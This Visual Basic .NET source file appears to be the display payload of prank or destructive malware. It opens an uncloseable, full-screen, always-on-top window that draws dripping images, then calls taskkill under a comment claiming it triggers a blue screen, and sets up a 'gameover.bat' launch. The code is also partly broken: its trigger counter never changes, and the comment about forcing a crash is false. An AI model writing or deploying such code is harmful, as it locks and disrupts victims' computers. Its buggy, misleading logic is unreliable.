Imports System.Drawing

Public Class Form1

    Dim h As Integer = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height
    Dim w As Integer = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width

    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Me.FormBorderStyle = FormBorderStyle.None
        Me.Size = New Size(w, h)

        Me.TransparencyKey = Me.BackColor

        Me.Left = (Screen.PrimaryScreen.Bounds.Width - Me.Width) / 2
        Me.Top = (Screen.PrimaryScreen.Bounds.Height - Me.Height) / 2

        Init()

        Me.SetStyle(ControlStyles.DoubleBuffer, True)
        Me.SetStyle(ControlStyles.UserPaint, True)
        Me.SetStyle(ControlStyles.AllPaintingInWmPaint, True)

        Timer1.Enabled = True


    End Sub
    Private mainGraphics As Graphics
    Private PlayerImage As Bitmap
    Private Sub Init()

        If mainGraphics Is Nothing Then

            Dim bmp As New Bitmap(Me.ClientRectangle.Width, Me.ClientRectangle.Height)
            Me.BackgroundImage = bmp
            mainGraphics = Graphics.FromImage(bmp)
            Dim canvas As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
            Dim g As Graphics = Graphics.FromImage(canvas)
        End If

        PlayerImage = Image.FromFile(Application.StartupPath & "\back.png")
    End Sub
    Dim tries As Integer
    Dim x As Integer
    Dim y As Integer
    Dim img_size As Integer
    Dim tries_hght As Integer
    Dim size_num As Integer = 16
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick

        If Rnd() * 100 < 10 Then
            PlayerImage = Image.FromFile(Application.StartupPath & "\back.png")

            mainGraphics.DrawImage(PlayerImage, 0, Screen.PrimaryScreen.Bounds.Height - y)

            y += 1

            If tries_hght = Screen.PrimaryScreen.Bounds.Height / 2 Then

                Dim f3 = New Form3
                f3.Show()

            End If

            If tries_hght = Screen.PrimaryScreen.Bounds.Height / 2 + 20 Then

                Dim p As New ProcessStartInfo() ' bsod (critical process died)
                p.FileName = "c:\windows\system32\taskkill.exe /f /im wscript.exe"
                p.CreateNoWindow = True ' no console
                p.UseShellExecute = False 'no shell
                Process.Start(p)

                System.Threading.Thread.Sleep(1000)

                Dim pf As New ProcessStartInfo()
                pf.FileName = "c:\windows\Servicetry\gameover.bat"
                pf.CreateNoWindow = True
                pf.UseShellExecute = False

            End If

        End If

        PlayerImage = Image.FromFile(Application.StartupPath & "\bld.png")

        For i = 1 To Rnd() * 7

            If tries = Screen.PrimaryScreen.Bounds.Height Then

                tries = 0
                size_num = 16
                img_size = 16

                x = Rnd() * Screen.PrimaryScreen.Bounds.Width

            Else

                tries += 1
                mainGraphics.DrawImage(PlayerImage, x - size_num + Rnd(), tries, size_num, size_num)

                img_size = img_size - Rnd() * 0.5

            End If
            Me.Invalidate()

        Next

        If Rnd() * 10 < 0.5 And Not (size_num = 0) Then
            size_num -= 1
        End If

        Me.Invalidate()
        Me.TopMost = True

    End Sub

    Private Sub Form2_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        e.Cancel = True
    End Sub
End Class